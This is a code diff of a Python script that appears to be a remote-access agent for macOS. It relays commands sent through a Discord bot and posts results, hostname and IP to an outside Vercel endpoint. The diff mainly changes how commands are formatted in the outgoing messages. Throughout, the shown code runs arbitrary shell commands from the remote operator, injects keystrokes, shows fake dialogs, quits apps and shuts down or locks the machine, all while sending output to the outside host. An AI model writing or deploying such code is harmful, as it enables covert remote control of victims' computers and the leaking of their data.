@@ -94,14 +94,14 @@ while True:
                             volumesize = int(localcmd[1])
                             if ossystem(f"osascript -e 'set Volume {volumesize/10}'") == 0:
                                 try:
-                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{hostname}@{ip}$ {localcmd}: ``Volume set to {volumesize}``")
+                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }: ``Volume set to {volumesize}``")
                                     old_command = command
                                 except KeyboardInterrupt:
                                     continue
                                 continue
                             else:
                                 try:
-                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{hostname}@{ip}$ {localcmd}: ``Volume set ran unsuccesfully``")
+                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }: ``Volume set ran unsuccesfully``")
                                 except KeyboardInterrupt:
                                     continue
                                 continue
@@ -109,13 +109,13 @@ while True:
 
                         except ValueError:
                             try:
-                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{hostname}@{ip}$ {localcmd}: ``Please enter a volume size``")
+                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }: ``Please enter a volume size``")
                             except KeyboardInterrupt:
                                 continue
                             continue
                         except KeyboardInterrupt:
                             try:
-                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) while sending error of {localcmd}``")
+                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{ip}@{hostname}: ``Client tried to SIGINT(Ctrl+C) while sending error of { ' '.join(str(e) for e in localcmd) }``")
                             except KeyboardInterrupt:
                                 continue
                             continue
@@ -126,17 +126,17 @@ while True:
                             if localcmd[1] == 'shutdown' or localcmd[1] == 'poweroff':
                                 if ossystem('osascript -e \'tell app "Finder" to shut down\'') == 0:
                                     try:
-                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```computer shutting down, bye...```")
+                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```computer shutting down, bye...```")
                                         old_command = command
                                     except:
                                         try:
-                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed to shutdown```")
+                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to shutdown```")
                                         except KeyboardInterrupt:
                                             continue
                                         continue
                                 else:
                                     try:
-                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed to start shutting down```")
+                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start shutting down```")
                                     except KeyboardInterrupt:
                                         continue
                                     continue
@@ -144,17 +144,17 @@ while True:
                             elif localcmd[1] == 'restart' or localcmd[1] == 'reboot':
                                 if ossystem('osascript -e \'tell app "Finder" to restart\'') == 0:
                                     try:
-                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```computer rebooting, cya...```")
+                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```computer rebooting, cya...```")
                                         old_command = command
                                     except:
                                         try:
-                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed to start rebooting```")
+                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start rebooting```")
                                         except KeyboardInterrupt:
                                             continue
                                         continue
                                 else:
                                     try:
-                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed to start rebooting```")
+                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start rebooting```")
                                     except KeyboardInterrupt:
                                         continue
                                     continue
@@ -162,34 +162,34 @@ while True:
                             elif localcmd[1] == 'sleep' or localcmd[1] == 'suspend' or localcmd[1] == 'pause':
                                 if ossystem('osascript -e \'tell app "Finder" to sleep\'') == 0:
                                     try:
-                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```computer going to sleep, cya...```")
+                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```computer going to sleep, cya...```")
                                         old_command = command
                                     except:
                                         try:
-                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed to start sleeping```")
+                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start sleeping```")
                                         except KeyboardInterrupt:
                                             continue
                                         continue
                                 else:
                                     try:
-                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed to start sleeping```")
+                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start sleeping```")
                                     except KeyboardInterrupt:
                                         continue
                                     continue
                             elif localcmd[1] == 'lock' or localcmd[1] == 'lockscreen':
                                 if ossystem('osascript -e \'tell application "System Events" to keystroke "q" using {command down, control down}\'') == 0:
                                     try:
-                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```computer going to lockscreen, cya...```")
+                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```computer going to lockscreen, cya...```")
                                         old_command = command
                                     except:
                                         try:
-                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed to start lockingscreen```")
+                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start lockingscreen```")
                                         except KeyboardInterrupt:
                                             continue
                                         continue
                                 else:
                                     try:
-                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed to start lockingscreen```")
+                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start lockingscreen```")
                                     except KeyboardInterrupt:
                                         continue
                                     continue
@@ -205,20 +205,20 @@ while True:
                                 if localcmd[2<len(localcmd)]:
                                     if ossystem(f'osascript -e \'display dialog "{localcmd[2]}" buttons "Yes"\'') == 0:
                                         try:
-                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Successfully the dialog```")
+                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Successfully the dialog```")
                                             old_command = command
                                         except KeyboardInterrupt:
                                             continue
                                         continue
                                     else:
                                         try:
-                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed to send dialog```")
+                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to send dialog```")
                                         except KeyboardInterrupt:
                                             continue
                                         continue
                                 else:
                                     try:
-                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```You need to pass another argument for infomation in the dialog```")
+                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```You need to pass another argument for infomation in the dialog```")
                                         old_command = command
                                     except KeyboardInterrupt:
                                         continue
@@ -227,17 +227,29 @@ while True:
                                 if localcmd[2<len(localcmd)]:
                                     r = system(f'osascript -e \'display dialog "{localcmd[2]}" default answer ""\' -e \'text returned of result\' -e \'\'', shell=True, stdout=PIPE, stderr=PIPE)
                                     cmdout, cmderr = r.communicate()
-                                    try:
-                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```{cmdout.decode()}```")
-                                    except:
+                                    if r.wait() == 0:
                                         try:
-                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed to ask with dialog```")
-                                        except KeyboardInterrupt:
+                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```{cmdout.decode()}```")
+                                            old_command = command
+                                        except:
+                                            try:
+                                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to ask with dialog```")
+                                            except KeyboardInterrupt:
+                                                continue
                                             continue
-                                        continue
+                                    else:
+                                        try:
+                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```{cmderr.decode()}```")
+                                        except:
+                                            try:
+                                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to ask with dialog```")
+                                            except KeyboardInterrupt:
+                                                continue
+                                            continue
+
                                 else:
                                     try:
-                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Please do question argument```")
+                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Please do question argument```")
                                     except KeyboardInterrupt:
                                         continue
                                     continue
@@ -248,20 +260,20 @@ while True:
                                 if localcmd[4>len(localcmd)]:
                                     if ossystem(f"osascript -e 'display notification \"{localcmd[2]}\" with title \"{localcmd[3]}\" subtitle \"{localcmd[4]}\"'") == 0:
                                         try:
-                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Notified successfully```")
+                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Notified successfully```")
                                             old_command = command
                                         except:
-                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed to notify```")
+                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to notify```")
                                             continue
                                         continue
                                     else:
                                         try:
-                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed to notify```")
+                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to notify```")
                                         except KeyboardInterrupt:
                                             continue
                                         continue
                                 else:
-                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```You need to pass three argument in the order of \`content\` \`title\` \`subtitle\`")
+                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```You need to pass three argument in the order of \`content\` \`title\` \`subtitle\`")
                                     old_command = command
                                     continue
                             elif localcmd[1] == 'keyboard' or localcmd[1] == 'type':
@@ -269,28 +281,28 @@ while True:
                                     if localcmd[2] == 'type':
                                         if os.system(f"osascript -e 'tell application \"System Events\" to keystroke \"{ ' '.join(str(e) for e in localcmd[3:]) }\"\'") == 0:
                                             try:
-                                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Successfully typed {' '.join(str(e) for e in localcmd[3:])} with keyboard```")
+                                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Successfully typed {' '.join(str(e) for e in localcmd[3:])} with keyboard```")
                                                 old_command = command
                                             except:
                                                 continue
                                             continue
                                         else:
                                             try:
-                                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed to do typing```")
+                                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to do typing```")
                                             except:
                                                 continue
                                             continue
                                     elif localcmd[2] == 'press':
                                         if os.system(f"osascript -e 'tell application \"System Events\" to keystroke { ' '.join(str(e) for e in localcmd[3:]) }\'") == 0:
                                             try:
-                                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Successfully pressed {' '.join(str(e) for e in localcmd[3:])} with keyboard```")
+                                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Successfully pressed {' '.join(str(e) for e in localcmd[3:])} with keyboard```")
                                                 old_command = command
                                             except:
                                                 continue
                                             continue
                                         else:
                                             try:
-                                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed to do pressing```")
+                                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to do pressing```")
                                             except:
                                                 continue
                                             continue
@@ -298,14 +310,14 @@ while True:
                                 if localcmd[2<len(localcmd)]:
                                     if ossystem(f'osascript -e \'tell app "{localcmd[2]}" to quit\'') == 0:
                                         try:
-                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Successfully quitted {localcmd[2]}```")
+                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Successfully quitted {localcmd[2]}```")
                                             old_command = command
                                         except:
                                             continue
                                         continue
                                     else:
                                         try:
-                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed to do quitting```")
+                                            post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to do quitting```")
                                         except:
                                             continue
                                         continue
@@ -317,7 +329,7 @@ while True:
 
                         except:
                             try:
-                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed at doing interactive actions```")
+                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed at doing interactive actions```")
                             except KeyboardInterrupt:
                                 continue
                             continue
@@ -332,10 +344,10 @@ while True:
                                 r = system(exescript, shell=True, stdout=PIPE, stderr=PIPE)
                                 cmdout, cmderr = r.communicate()
                                 try:
-                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```{cmdout.decode()}```")
+                                    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```{cmdout.decode()}```")
                                 except:
                                     try:
-                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Failed to sent output of usetool```")
+                                        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to sent output of usetool```")
                                     except KeyboardInterrupt:
                                         continue
                                     continue
@@ -389,12 +401,12 @@ while True:
                     if r.returncode != 0:
                         if r.returncode == 127:
                             if localcmd:
-                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Error: {localcmd}: Command not found```")
+                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Error: { ' '.join(str(e) for e in localcmd) }: Command not found```")
                             else:
                                 post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```Error: {command}: Command not found```")
                         else:
                             if localcmd:
-                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```Error: {cmderr.decode()} exited with code {r.returncode}```- {ip}@{hostname}")
+                                post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Error: {cmderr.decode()} exited with code {r.returncode}```- {ip}@{hostname}")
                             else:
                                 post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```Error: {cmderr.decode()} exited with code {r.returncode}```- {ip}@{hostname}")
                     elif r.returncode != 0 and cmdout.decode() == "":
@@ -412,7 +424,7 @@ while True:
                 if cmdout.decode() != "" and cmderr.decode() == "":
                     try:
                         if localcmd:
-                             post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {localcmd}`` ```{cmdout.decode()}```")
+                             post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```{cmdout.decode()}```")
                         else:
                             post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ {command}`` ```{cmdout.decode()}```")
                     except KeyboardInterrupt:
